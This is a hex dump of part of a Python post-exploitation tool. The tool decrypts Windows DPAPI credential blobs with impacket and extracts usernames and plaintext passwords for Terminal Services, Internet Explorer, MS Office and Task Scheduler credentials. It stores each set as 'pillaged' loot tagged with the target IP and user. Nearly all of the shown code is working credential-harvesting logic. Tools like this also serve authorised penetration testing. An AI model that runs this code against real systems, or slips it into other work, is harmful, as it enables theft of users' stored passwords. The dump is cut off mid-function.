+0000f3e0: 6173 2065 783a 0a09 0909 0909 0973 656c  as ex:.......sel
+0000f3f0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+0000f400: 0a09 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
+0000f410: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+0000f420: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
+0000f430: 524e 494e 477d 4578 6365 7074 696f 6e20  RNING}Exception 
+0000f440: 3220 6465 6372 7970 7465 645f 626c 6f62  2 decrypted_blob
+0000f450: 2e61 7474 7269 6275 7465 7320 7b62 636f  .attributes {bco
+0000f460: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+0000f470: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+0000f480: 6465 6275 6728 6578 290a 0909 0909 0909  debug(ex).......
+0000f490: 656e 7472 792e 6475 6d70 2829 0a09 0909  entry.dump()....
+0000f4a0: 0909 0963 6f6e 7469 6e75 650a 0a09 0909  ...continue.....
+0000f4b0: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
+0000f4c0: 4553 5349 4e47 2044 4154 410a 0909 0973  ESSING DATA....s
+0000f4d0: 656c 662e 6462 2e61 6464 5f63 7265 647a  elf.db.add_credz
+0000f4e0: 2863 7265 647a 5f74 7970 653d 2763 7265  (credz_type='cre
+0000f4f0: 6465 6e74 6961 6c2d 626c 6f62 272c 0a09  dential-blob',..
+0000f500: 0909 0909 0909 2020 6372 6564 7a5f 7573  ......  credz_us
+0000f510: 6572 6e61 6d65 3d64 6563 7279 7074 6564  ername=decrypted
+0000f520: 5f62 6c6f 625b 2755 7365 726e 616d 6527  _blob['Username'
+0000f530: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
+0000f540: 6c65 2729 2c0a 0909 0909 0909 0920 2063  le'),........  c
+0000f550: 7265 647a 5f70 6173 7377 6f72 643d 7061  redz_password=pa
+0000f560: 7373 776f 7264 2c0a 0909 0909 0909 0920  ssword,........ 
+0000f570: 2063 7265 647a 5f74 6172 6765 743d 6465   credz_target=de
+0000f580: 6372 7970 7465 645f 626c 6f62 5b27 5461  crypted_blob['Ta
+0000f590: 7267 6574 275d 2e64 6563 6f64 6528 2775  rget'].decode('u
+0000f5a0: 7466 2d31 366c 6527 292c 0a09 0909 0909  tf-16le'),......
+0000f5b0: 0909 2020 6372 6564 7a5f 7061 7468 3d6c  ..  credz_path=l
+0000f5c0: 6f63 616c 6669 6c65 2c0a 0909 0909 0909  ocalfile,.......
+0000f5d0: 0920 2070 696c 6c61 6765 645f 6672 6f6d  .  pillaged_from
+0000f5e0: 5f63 6f6d 7075 7465 725f 6970 3d73 656c  _computer_ip=sel
+0000f5f0: 662e 6f70 7469 6f6e 732e 7461 7267 6574  f.options.target
+0000f600: 5f69 702c 0a09 0909 0909 0909 2020 7069  _ip,........  pi
+0000f610: 6c6c 6167 6564 5f66 726f 6d5f 7573 6572  llaged_from_user
+0000f620: 6e61 6d65 3d75 7365 722e 7573 6572 6e61  name=user.userna
+0000f630: 6d65 290a 0a09 0909 7365 6c66 2e6c 6f67  me).....self.log
+0000f640: 6769 6e67 2e64 6562 7567 2869 6e66 6f29  ging.debug(info)
+0000f650: 0a09 0909 7265 7475 726e 2069 6e66 6f0a  ....return info.
+0000f660: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
+0000f670: 6f6e 2061 7320 6578 3a0a 0909 0973 656c  on as ex:....sel
+0000f680: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+0000f690: 0a09 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+0000f6a0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+0000f6b0: 5d20 7b62 636f 6c6f 7273 2e57 4152 4e49  ] {bcolors.WARNI
+0000f6c0: 4e47 7d45 7863 6570 7469 6f6e 2033 2064  NG}Exception 3 d
+0000f6d0: 756d 705f 6372 6564 656e 7469 616c 5f62  ump_credential_b
+0000f6e0: 6c6f 6220 7b62 636f 6c6f 7273 2e45 4e44  lob {bcolors.END
+0000f6f0: 437d 2229 0a09 0909 7365 6c66 2e6c 6f67  C}")....self.log
+0000f700: 6769 6e67 2e64 6562 7567 2865 7829 0a0a  ging.debug(ex)..
+0000f710: 0964 6566 2064 756d 705f 4352 4544 454e  .def dump_CREDEN
+0000f720: 5449 414c 5f54 5345 2873 656c 662c 2075  TIAL_TSE(self, u
+0000f730: 7365 722c 206c 6f63 616c 6669 6c65 2c20  ser, localfile, 
+0000f740: 6465 6372 7970 7465 645f 626c 6f62 293a  decrypted_blob):
+0000f750: 0a09 0923 2066 726f 6d20 696d 7061 636b  ...# from impack
+0000f760: 6574 2e65 7365 2069 6d70 6f72 7420 6765  et.ese import ge
+0000f770: 7455 6e69 7854 696d 650a 0909 7472 793a  tUnixTime...try:
+0000f780: 0a09 0909 7365 6c66 2e6c 6f67 6769 6e67  ....self.logging
+0000f790: 2e64 6562 7567 2822 4475 6d70 696e 6720  .debug("Dumping 
+0000f7a0: 5453 4520 6465 6372 7970 7465 6420 6372  TSE decrypted cr
+0000f7b0: 6564 656e 7469 616c 2062 6c6f 6220 696e  edential blob in
+0000f7c0: 666f 2074 6f20 6669 6c65 2229 0a09 0909  fo to file")....
+0000f7d0: 2320 7365 6c66 2e6c 6f67 6769 6e67 2e64  # self.logging.d
+0000f7e0: 6562 7567 2864 6563 7279 7074 6564 5f62  ebug(decrypted_b
+0000f7f0: 6c6f 6229 0a09 0909 696e 666f 203d 2022  lob)....info = "
+0000f800: 5c6e 220a 0909 0969 6e66 6f20 2b3d 2066  \n"....info += f
+0000f810: 225b 4352 4544 454e 5449 414c 5d5c 6e22  "[CREDENTIAL]\n"
+0000f820: 0a09 0909 7472 793a 0a09 0909 0969 6e66  ....try:.....inf
+0000f830: 6f20 2b3d 2066 224c 6173 7457 7269 7474  o += f"LastWritt
+0000f840: 656e 203a 207b 6461 7465 7469 6d65 2e75  en : {datetime.u
+0000f850: 7463 6672 6f6d 7469 6d65 7374 616d 7028  tcfromtimestamp(
+0000f860: 696d 7061 636b 6574 2e64 7061 7069 2e67  impacket.dpapi.g
+0000f870: 6574 556e 6978 5469 6d65 2864 6563 7279  etUnixTime(decry
+0000f880: 7074 6564 5f62 6c6f 625b 274c 6173 7457  pted_blob['LastW
+0000f890: 7269 7474 656e 275d 2929 7d5c 6e22 0a09  ritten']))}\n"..
+0000f8a0: 0909 0969 6e66 6f20 2b3d 2066 2246 6c61  ...info += f"Fla
+0000f8b0: 6773 2020 2020 2020 203a 207b 6465 6372  gs       : {decr
+0000f8c0: 7970 7465 645f 626c 6f62 5b27 466c 6167  ypted_blob['Flag
+0000f8d0: 7327 5d7d 2028 7b69 6d70 6163 6b65 742e  s']} ({impacket.
+0000f8e0: 6470 6170 692e 6765 7446 6c61 6773 2869  dpapi.getFlags(i
+0000f8f0: 6d70 6163 6b65 742e 6470 6170 692e 4352  mpacket.dpapi.CR
+0000f900: 4544 454e 5449 414c 5f46 4c41 4753 2c20  EDENTIAL_FLAGS, 
+0000f910: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000f920: 466c 6167 7327 5d29 7d29 5c6e 220a 0909  Flags'])})\n"...
+0000f930: 0909 696e 666f 202b 3d20 6622 5065 7273  ..info += f"Pers
+0000f940: 6973 7420 2020 2020 3a20 3078 7b64 6563  ist     : 0x{dec
+0000f950: 7279 7074 6564 5f62 6c6f 625b 2750 6572  rypted_blob['Per
+0000f960: 7369 7374 275d 7d20 287b 696d 7061 636b  sist']} ({impack
+0000f970: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
+0000f980: 4941 4c5f 5045 5253 4953 5428 6465 6372  IAL_PERSIST(decr
+0000f990: 7970 7465 645f 626c 6f62 5b27 5065 7273  ypted_blob['Pers
+0000f9a0: 6973 7427 5d29 2e6e 616d 657d 295c 6e22  ist']).name})\n"
+0000f9b0: 0a09 0909 0969 6e66 6f20 2b3d 2066 2254  .....info += f"T
+0000f9c0: 7970 6520 2020 2020 2020 203a 2030 787b  ype        : 0x{
+0000f9d0: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000f9e0: 5479 7065 275d 7d20 287b 696d 7061 636b  Type']} ({impack
+0000f9f0: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
+0000fa00: 4941 4c5f 5045 5253 4953 5428 6465 6372  IAL_PERSIST(decr
+0000fa10: 7970 7465 645f 626c 6f62 5b27 5479 7065  ypted_blob['Type
+0000fa20: 275d 292e 6e61 6d65 7d29 5c6e 220a 0909  ']).name})\n"...
+0000fa30: 0965 7863 6570 7420 4578 6365 7074 696f  .except Exceptio
+0000fa40: 6e20 6173 2065 783a 0a09 0909 0973 656c  n as ex:.....sel
+0000fa50: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+0000fa60: 0a09 0909 0909 6622 5b7b 7365 6c66 2e6f  ......f"[{self.o
+0000fa70: 7074 696f 6e73 2e74 6172 6765 745f 6970  ptions.target_ip
+0000fa80: 7d5d 207b 6263 6f6c 6f72 732e 5741 524e  }] {bcolors.WARN
+0000fa90: 494e 477d 4578 6365 7074 696f 6e20 3120  ING}Exception 1 
+0000faa0: 6465 6372 7970 7465 645f 626c 6f62 2e61  decrypted_blob.a
+0000fab0: 7474 7269 6275 7465 7320 7b62 636f 6c6f  ttributes {bcolo
+0000fac0: 7273 2e45 4e44 437d 2229 0a09 0909 0973  rs.ENDC}").....s
+0000fad0: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+0000fae0: 6728 6578 290a 0909 0969 6e66 6f20 2b3d  g(ex)....info +=
+0000faf0: 2066 2254 6172 6765 7420 2020 2020 203a   f"Target      :
+0000fb00: 207b 6465 6372 7970 7465 645f 626c 6f62   {decrypted_blob
+0000fb10: 5b27 5461 7267 6574 275d 2e64 6563 6f64  ['Target'].decod
+0000fb20: 6528 2775 7466 2d31 366c 6527 297d 5c6e  e('utf-16le')}\n
+0000fb30: 220a 0909 0969 6e66 6f20 2b3d 2066 2244  "....info += f"D
+0000fb40: 6573 6372 6970 7469 6f6e 203a 207b 6465  escription : {de
+0000fb50: 6372 7970 7465 645f 626c 6f62 5b27 4465  crypted_blob['De
+0000fb60: 7363 7269 7074 696f 6e27 5d2e 6465 636f  scription'].deco
+0000fb70: 6465 2827 7574 662d 3136 6c65 2729 7d5c  de('utf-16le')}\
+0000fb80: 6e22 0a09 0909 696e 666f 202b 3d20 6622  n"....info += f"
+0000fb90: 556e 6b6e 6f77 6e20 2020 2020 3a20 7b64  Unknown     : {d
+0000fba0: 6563 7279 7074 6564 5f62 6c6f 625b 2755  ecrypted_blob['U
+0000fbb0: 6e6b 6e6f 776e 275d 2e64 6563 6f64 6528  nknown'].decode(
+0000fbc0: 2775 7466 2d31 366c 6527 297d 5c6e 220a  'utf-16le')}\n".
+0000fbd0: 0909 0969 6e66 6f20 2b3d 2066 2255 7365  ...info += f"Use
+0000fbe0: 726e 616d 6520 2020 203a 207b 6465 6372  rname    : {decr
+0000fbf0: 7970 7465 645f 626c 6f62 5b27 5573 6572  ypted_blob['User
+0000fc00: 6e61 6d65 275d 2e64 6563 6f64 6528 2775  name'].decode('u
+0000fc10: 7466 2d31 366c 6527 297d 5c6e 220a 0909  tf-16le')}\n"...
+0000fc20: 0974 7279 3a0a 0909 0909 696e 666f 202b  .try:.....info +
+0000fc30: 3d20 6622 556e 6b6e 6f77 6e33 2020 2020  = f"Unknown3    
+0000fc40: 203a 207b 6465 6372 7970 7465 645f 626c   : {decrypted_bl
+0000fc50: 6f62 5b27 556e 6b6e 6f77 6e33 275d 2e64  ob['Unknown3'].d
+0000fc60: 6563 6f64 6528 2775 7466 2d31 366c 6527  ecode('utf-16le'
+0000fc70: 297d 5c6e 220a 0909 0909 7061 7373 776f  )}\n".....passwo
+0000fc80: 7264 203d 2064 6563 7279 7074 6564 5f62  rd = decrypted_b
+0000fc90: 6c6f 625b 2755 6e6b 6e6f 776e 3327 5d2e  lob['Unknown3'].
+0000fca0: 6465 636f 6465 2827 7574 662d 3136 6c65  decode('utf-16le
+0000fcb0: 2729 0a09 0909 6578 6365 7074 2055 6e69  ')....except Uni
+0000fcc0: 636f 6465 4465 636f 6465 4572 726f 723a  codeDecodeError:
+0000fcd0: 0a09 0909 0969 6e66 6f20 2b3d 2066 2255  .....info += f"U
+0000fce0: 6e6b 6e6f 776e 332e 2020 2020 203a 207b  nknown3.     : {
+0000fcf0: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000fd00: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
+0000fd10: 6528 276c 6174 696e 2d31 2729 7d5c 6e22  e('latin-1')}\n"
+0000fd20: 0a09 0909 0970 6173 7377 6f72 6420 3d20  .....password = 
+0000fd30: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+0000fd40: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
+0000fd50: 6528 276c 6174 696e 2d31 2729 0a09 0909  e('latin-1')....
+0000fd60: 2323 2323 2323 2323 2323 2323 5052 4f43  ############PROC
+0000fd70: 4553 5349 4e47 2044 4154 410a 0909 0973  ESSING DATA....s
+0000fd80: 656c 662e 6462 2e61 6464 5f63 7265 647a  elf.db.add_credz
+0000fd90: 2863 7265 647a 5f74 7970 653d 2762 726f  (credz_type='bro
+0000fda0: 7773 6572 2d69 6e74 6572 6e65 745f 6578  wser-internet_ex
+0000fdb0: 706c 6f72 6572 272c 0a09 0909 0909 0909  plorer',........
+0000fdc0: 2020 6372 6564 7a5f 7573 6572 6e61 6d65    credz_username
+0000fdd0: 3d64 6563 7279 7074 6564 5f62 6c6f 625b  =decrypted_blob[
+0000fde0: 2755 7365 726e 616d 6527 5d2e 6465 636f  'Username'].deco
+0000fdf0: 6465 2827 7574 662d 3136 6c65 2729 2c0a  de('utf-16le'),.
+0000fe00: 0909 0909 0909 0920 2063 7265 647a 5f70  .......  credz_p
+0000fe10: 6173 7377 6f72 643d 7061 7373 776f 7264  assword=password
+0000fe20: 2c0a 0909 0909 0909 0920 2063 7265 647a  ,........  credz
+0000fe30: 5f74 6172 6765 743d 6465 6372 7970 7465  _target=decrypte
+0000fe40: 645f 626c 6f62 5b27 5461 7267 6574 275d  d_blob['Target']
+0000fe50: 2e64 6563 6f64 6528 2775 7466 2d31 366c  .decode('utf-16l
+0000fe60: 6527 292c 0a09 0909 0909 0909 2020 6372  e'),........  cr
+0000fe70: 6564 7a5f 7061 7468 3d6c 6f63 616c 6669  edz_path=localfi
+0000fe80: 6c65 2c0a 0909 0909 0909 0920 2070 696c  le,........  pil
+0000fe90: 6c61 6765 645f 6672 6f6d 5f63 6f6d 7075  laged_from_compu
+0000fea0: 7465 725f 6970 3d73 656c 662e 6f70 7469  ter_ip=self.opti
+0000feb0: 6f6e 732e 7461 7267 6574 5f69 702c 0a09  ons.target_ip,..
+0000fec0: 0909 0909 0909 2020 7069 6c6c 6167 6564  ......  pillaged
+0000fed0: 5f66 726f 6d5f 7573 6572 6e61 6d65 3d75  _from_username=u
+0000fee0: 7365 722e 7573 6572 6e61 6d65 290a 0909  ser.username)...
+0000fef0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0000ff00: 6275 6728 696e 666f 290a 0909 0972 6574  bug(info)....ret
+0000ff10: 7572 6e20 696e 666f 0a09 0965 7863 6570  urn info...excep
+0000ff20: 7420 4578 6365 7074 696f 6e20 6173 2065  t Exception as e
+0000ff30: 783a 0a09 0909 7365 6c66 2e6c 6f67 6769  x:....self.loggi
+0000ff40: 6e67 2e64 6562 7567 280a 0909 0909 6622  ng.debug(.....f"
+0000ff50: 5b7b 7365 6c66 2e6f 7074 696f 6e73 2e74  [{self.options.t
+0000ff60: 6172 6765 745f 6970 7d5d 207b 6263 6f6c  arget_ip}] {bcol
+0000ff70: 6f72 732e 5741 524e 494e 477d 4578 6365  ors.WARNING}Exce
+0000ff80: 7074 696f 6e20 3320 6475 6d70 5f63 7265  ption 3 dump_cre
+0000ff90: 6465 6e74 6961 6c5f 626c 6f62 207b 6263  dential_blob {bc
+0000ffa0: 6f6c 6f72 732e 454e 4443 7d22 290a 0909  olors.ENDC}")...
+0000ffb0: 0973 656c 662e 6c6f 6767 696e 672e 6465  .self.logging.de
+0000ffc0: 6275 6728 6578 290a 0a09 6465 6620 6475  bug(ex)...def du
+0000ffd0: 6d70 5f43 5245 4445 4e54 4941 4c5f 4d53  mp_CREDENTIAL_MS
+0000ffe0: 4f46 4649 4345 2873 656c 662c 2075 7365  OFFICE(self, use
+0000fff0: 722c 206c 6f63 616c 6669 6c65 2c20 6465  r, localfile, de
+00010000: 6372 7970 7465 645f 626c 6f62 293a 0a09  crypted_blob):..
+00010010: 0923 2066 726f 6d20 696d 7061 636b 6574  .# from impacket
+00010020: 2e65 7365 2069 6d70 6f72 7420 6765 7455  .ese import getU
+00010030: 6e69 7854 696d 650a 0909 7472 793a 0a09  nixTime...try:..
+00010040: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00010050: 6562 7567 2822 4475 6d70 696e 6720 4d69  ebug("Dumping Mi
+00010060: 6372 6f73 6f66 7420 4f66 6669 6365 2064  crosoft Office d
+00010070: 6563 7279 7074 6564 2063 7265 6465 6e74  ecrypted credent
+00010080: 6961 6c20 626c 6f62 2069 6e66 6f20 746f  ial blob info to
+00010090: 2066 696c 6522 290a 0909 0923 2073 656c   file")....# sel
+000100a0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+000100b0: 6465 6372 7970 7465 645f 626c 6f62 290a  decrypted_blob).
+000100c0: 0909 0969 6e66 6f20 3d20 225c 6e22 0a09  ...info = "\n"..
+000100d0: 0909 696e 666f 202b 3d20 6622 5b43 5245  ..info += f"[CRE
+000100e0: 4445 4e54 4941 4c5d 5c6e 220a 0909 0974  DENTIAL]\n"....t
+000100f0: 7279 3a0a 0909 0909 696e 666f 202b 3d20  ry:.....info += 
+00010100: 6622 4c61 7374 5772 6974 7465 6e20 3a20  f"LastWritten : 
+00010110: 7b64 6174 6574 696d 652e 7574 6366 726f  {datetime.utcfro
+00010120: 6d74 696d 6573 7461 6d70 2869 6d70 6163  mtimestamp(impac
+00010130: 6b65 742e 6470 6170 692e 6765 7455 6e69  ket.dpapi.getUni
+00010140: 7854 696d 6528 6465 6372 7970 7465 645f  xTime(decrypted_
+00010150: 626c 6f62 5b27 4c61 7374 5772 6974 7465  blob['LastWritte
+00010160: 6e27 5d29 297d 5c6e 220a 0909 0909 696e  n']))}\n".....in
+00010170: 666f 202b 3d20 6622 466c 6167 7320 2020  fo += f"Flags   
+00010180: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
+00010190: 5f62 6c6f 625b 2746 6c61 6773 275d 7d20  _blob['Flags']} 
+000101a0: 287b 696d 7061 636b 6574 2e64 7061 7069  ({impacket.dpapi
+000101b0: 2e67 6574 466c 6167 7328 696d 7061 636b  .getFlags(impack
+000101c0: 6574 2e64 7061 7069 2e43 5245 4445 4e54  et.dpapi.CREDENT
+000101d0: 4941 4c5f 464c 4147 532c 2064 6563 7279  IAL_FLAGS, decry
+000101e0: 7074 6564 5f62 6c6f 625b 2746 6c61 6773  pted_blob['Flags
+000101f0: 275d 297d 295c 6e22 0a09 0909 0969 6e66  '])})\n".....inf
+00010200: 6f20 2b3d 2066 2250 6572 7369 7374 2020  o += f"Persist  
+00010210: 2020 203a 2030 787b 6465 6372 7970 7465     : 0x{decrypte
+00010220: 645f 626c 6f62 5b27 5065 7273 6973 7427  d_blob['Persist'
+00010230: 5d7d 2028 7b69 6d70 6163 6b65 742e 6470  ]} ({impacket.dp
+00010240: 6170 692e 4352 4544 454e 5449 414c 5f50  api.CREDENTIAL_P
+00010250: 4552 5349 5354 2864 6563 7279 7074 6564  ERSIST(decrypted
+00010260: 5f62 6c6f 625b 2750 6572 7369 7374 275d  _blob['Persist']
+00010270: 292e 6e61 6d65 7d29 5c6e 220a 0909 0909  ).name})\n".....
+00010280: 696e 666f 202b 3d20 6622 5479 7065 2020  info += f"Type  
+00010290: 2020 2020 2020 3a20 3078 7b64 6563 7279        : 0x{decry
+000102a0: 7074 6564 5f62 6c6f 625b 2754 7970 6527  pted_blob['Type'
+000102b0: 5d7d 2028 7b69 6d70 6163 6b65 742e 6470  ]} ({impacket.dp
+000102c0: 6170 692e 4352 4544 454e 5449 414c 5f50  api.CREDENTIAL_P
+000102d0: 4552 5349 5354 2864 6563 7279 7074 6564  ERSIST(decrypted
+000102e0: 5f62 6c6f 625b 2754 7970 6527 5d29 2e6e  _blob['Type']).n
+000102f0: 616d 657d 295c 6e22 0a09 0909 6578 6365  ame})\n"....exce
+00010300: 7074 2045 7863 6570 7469 6f6e 2061 7320  pt Exception as 
+00010310: 6578 3a0a 0909 0909 7365 6c66 2e6c 6f67  ex:.....self.log
+00010320: 6769 6e67 2e64 6562 7567 280a 0909 0909  ging.debug(.....
+00010330: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+00010340: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+00010350: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
+00010360: 7863 6570 7469 6f6e 2031 2064 6563 7279  xception 1 decry
+00010370: 7074 6564 5f62 6c6f 622e 6174 7472 6962  pted_blob.attrib
+00010380: 7574 6573 207b 6263 6f6c 6f72 732e 454e  utes {bcolors.EN
+00010390: 4443 7d22 290a 0909 0909 7365 6c66 2e6c  DC}").....self.l
+000103a0: 6f67 6769 6e67 2e64 6562 7567 2865 7829  ogging.debug(ex)
+000103b0: 0a09 0909 696e 666f 202b 3d20 6622 5461  ....info += f"Ta
+000103c0: 7267 6574 2020 2020 2020 3a20 7b64 6563  rget      : {dec
+000103d0: 7279 7074 6564 5f62 6c6f 625b 2754 6172  rypted_blob['Tar
+000103e0: 6765 7427 5d2e 6465 636f 6465 2827 7574  get'].decode('ut
+000103f0: 662d 3136 6c65 2729 7d5c 6e22 0a09 0909  f-16le')}\n"....
+00010400: 696e 666f 202b 3d20 6622 4465 7363 7269  info += f"Descri
+00010410: 7074 696f 6e20 3a20 7b64 6563 7279 7074  ption : {decrypt
+00010420: 6564 5f62 6c6f 625b 2744 6573 6372 6970  ed_blob['Descrip
+00010430: 7469 6f6e 275d 2e64 6563 6f64 6528 2775  tion'].decode('u
+00010440: 7466 2d31 366c 6527 297d 5c6e 220a 0909  tf-16le')}\n"...
+00010450: 0969 6e66 6f20 2b3d 2066 2255 6e6b 6e6f  .info += f"Unkno
+00010460: 776e 2020 2020 203a 207b 6465 6372 7970  wn     : {decryp
+00010470: 7465 645f 626c 6f62 5b27 556e 6b6e 6f77  ted_blob['Unknow
+00010480: 6e27 5d2e 6465 636f 6465 2827 7574 662d  n'].decode('utf-
+00010490: 3136 6c65 2729 7d5c 6e22 0a09 0909 696e  16le')}\n"....in
+000104a0: 666f 202b 3d20 6622 5573 6572 6e61 6d65  fo += f"Username
+000104b0: 2020 2020 3a20 7b64 6563 7279 7074 6564      : {decrypted
+000104c0: 5f62 6c6f 625b 2755 7365 726e 616d 6527  _blob['Username'
+000104d0: 5d2e 6465 636f 6465 2827 7574 662d 3136  ].decode('utf-16
+000104e0: 6c65 2729 7d5c 6e22 0a09 0909 7472 793a  le')}\n"....try:
+000104f0: 0a09 0909 0969 6e66 6f20 2b3d 2066 2255  .....info += f"U
+00010500: 6e6b 6e6f 776e 3320 2020 2020 3a20 7b64  nknown3     : {d
+00010510: 6563 7279 7074 6564 5f62 6c6f 625b 2755  ecrypted_blob['U
+00010520: 6e6b 6e6f 776e 3327 5d2e 6465 636f 6465  nknown3'].decode
+00010530: 2827 7574 662d 3136 6c65 2729 7d5c 6e22  ('utf-16le')}\n"
+00010540: 0a09 0909 0970 6173 7377 6f72 6420 3d20  .....password = 
+00010550: 6465 6372 7970 7465 645f 626c 6f62 5b27  decrypted_blob['
+00010560: 556e 6b6e 6f77 6e33 275d 2e64 6563 6f64  Unknown3'].decod
+00010570: 6528 2775 7466 2d31 366c 6527 290a 0909  e('utf-16le')...
+00010580: 0965 7863 6570 7420 556e 6963 6f64 6544  .except UnicodeD
+00010590: 6563 6f64 6545 7272 6f72 3a0a 0909 0909  ecodeError:.....
+000105a0: 696e 666f 202b 3d20 6622 556e 6b6e 6f77  info += f"Unknow
+000105b0: 6e33 2e20 2020 2020 3a20 7b64 6563 7279  n3.     : {decry
+000105c0: 7074 6564 5f62 6c6f 625b 2755 6e6b 6e6f  pted_blob['Unkno
+000105d0: 776e 3327 5d2e 6465 636f 6465 2827 6c61  wn3'].decode('la
+000105e0: 7469 6e2d 3127 297d 5c6e 220a 0909 0909  tin-1')}\n".....
+000105f0: 7061 7373 776f 7264 203d 2064 6563 7279  password = decry
+00010600: 7074 6564 5f62 6c6f 625b 2755 6e6b 6e6f  pted_blob['Unkno
+00010610: 776e 3327 5d2e 6465 636f 6465 2827 6c61  wn3'].decode('la
+00010620: 7469 6e2d 3127 290a 0a09 0909 2323 2323  tin-1').....####
+00010630: 2323 2323 2323 2323 5052 4f43 4553 5349  ########PROCESSI
+00010640: 4e47 2044 4154 410a 0909 0973 656c 662e  NG DATA....self.
+00010650: 6462 2e61 6464 5f63 7265 647a 2863 7265  db.add_credz(cre
+00010660: 647a 5f74 7970 653d 2762 726f 7773 6572  dz_type='browser
+00010670: 2d69 6e74 6572 6e65 745f 6578 706c 6f72  -internet_explor
+00010680: 6572 272c 0a09 0909 0909 0909 2020 6372  er',........  cr
+00010690: 6564 7a5f 7573 6572 6e61 6d65 3d64 6563  edz_username=dec
+000106a0: 7279 7074 6564 5f62 6c6f 625b 2755 7365  rypted_blob['Use
+000106b0: 726e 616d 6527 5d2e 6465 636f 6465 2827  rname'].decode('
+000106c0: 7574 662d 3136 6c65 2729 2c0a 0909 0909  utf-16le'),.....
+000106d0: 0909 0920 2063 7265 647a 5f70 6173 7377  ...  credz_passw
+000106e0: 6f72 643d 7061 7373 776f 7264 2c0a 0909  ord=password,...
+000106f0: 0909 0909 0920 2063 7265 647a 5f74 6172  .....  credz_tar
+00010700: 6765 743d 6465 6372 7970 7465 645f 626c  get=decrypted_bl
+00010710: 6f62 5b27 5461 7267 6574 275d 2e64 6563  ob['Target'].dec
+00010720: 6f64 6528 2775 7466 2d31 366c 6527 292c  ode('utf-16le'),
+00010730: 0a09 0909 0909 0909 2020 6372 6564 7a5f  ........  credz_
+00010740: 7061 7468 3d6c 6f63 616c 6669 6c65 2c0a  path=localfile,.
+00010750: 0909 0909 0909 0920 2070 696c 6c61 6765  .......  pillage
+00010760: 645f 6672 6f6d 5f63 6f6d 7075 7465 725f  d_from_computer_
+00010770: 6970 3d73 656c 662e 6f70 7469 6f6e 732e  ip=self.options.
+00010780: 7461 7267 6574 5f69 702c 0a09 0909 0909  target_ip,......
+00010790: 0909 2020 7069 6c6c 6167 6564 5f66 726f  ..  pillaged_fro
+000107a0: 6d5f 7573 6572 6e61 6d65 3d75 7365 722e  m_username=user.
+000107b0: 7573 6572 6e61 6d65 290a 0909 0973 656c  username)....sel
+000107c0: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+000107d0: 696e 666f 290a 0909 0972 6574 7572 6e20  info)....return 
+000107e0: 696e 666f 0a09 0965 7863 6570 7420 4578  info...except Ex
+000107f0: 6365 7074 696f 6e20 6173 2065 783a 0a09  ception as ex:..
+00010800: 0909 7365 6c66 2e6c 6f67 6769 6e67 2e64  ..self.logging.d
+00010810: 6562 7567 280a 0909 0909 6622 5b7b 7365  ebug(.....f"[{se
+00010820: 6c66 2e6f 7074 696f 6e73 2e74 6172 6765  lf.options.targe
+00010830: 745f 6970 7d5d 207b 6263 6f6c 6f72 732e  t_ip}] {bcolors.
+00010840: 5741 524e 494e 477d 4578 6365 7074 696f  WARNING}Exceptio
+00010850: 6e20 3320 6475 6d70 5f63 7265 6465 6e74  n 3 dump_credent
+00010860: 6961 6c5f 626c 6f62 207b 6263 6f6c 6f72  ial_blob {bcolor
+00010870: 732e 454e 4443 7d22 290a 0909 0973 656c  s.ENDC}")....sel
+00010880: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00010890: 6578 290a 0a09 6465 6620 6475 6d70 5f43  ex)...def dump_C
+000108a0: 5245 4445 4e54 4941 4c5f 5441 534b 5343  REDENTIAL_TASKSC
+000108b0: 4845 4455 4c45 5228 7365 6c66 2c20 7573  HEDULER(self, us
+000108c0: 6572 2c20 6c6f 6361 6c66 696c 652c 2064  er, localfile, d
+000108d0: 6563 7279 7074 6564 5f62 6c6f 6229 3a0a  ecrypted_blob):.
+000108e0: 0909 2320 6672 6f6d 2069 6d70 6163 6b65  ..# from impacke
+000108f0: 742e 6573 6520 696d 706f 7274 2067 6574  t.ese import get
+00010900: 556e 6978 5469 6d65 0a09 0974 7279 3a0a  UnixTime...try:.
+00010910: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00010920: 6465 6275 6728 2244 756d 7069 6e67 2054  debug("Dumping T
+00010930: 4153 4b53 4348 4544 554c 4552 2064 6563  ASKSCHEDULER dec
+00010940: 7279 7074 6564 2063 7265 6465 6e74 6961  rypted credentia
+00010950: 6c20 626c 6f62 2069 6e66 6f20 746f 2066  l blob info to f
+00010960: 696c 6522 290a 0909 0923 2073 656c 662e  ile")....# self.
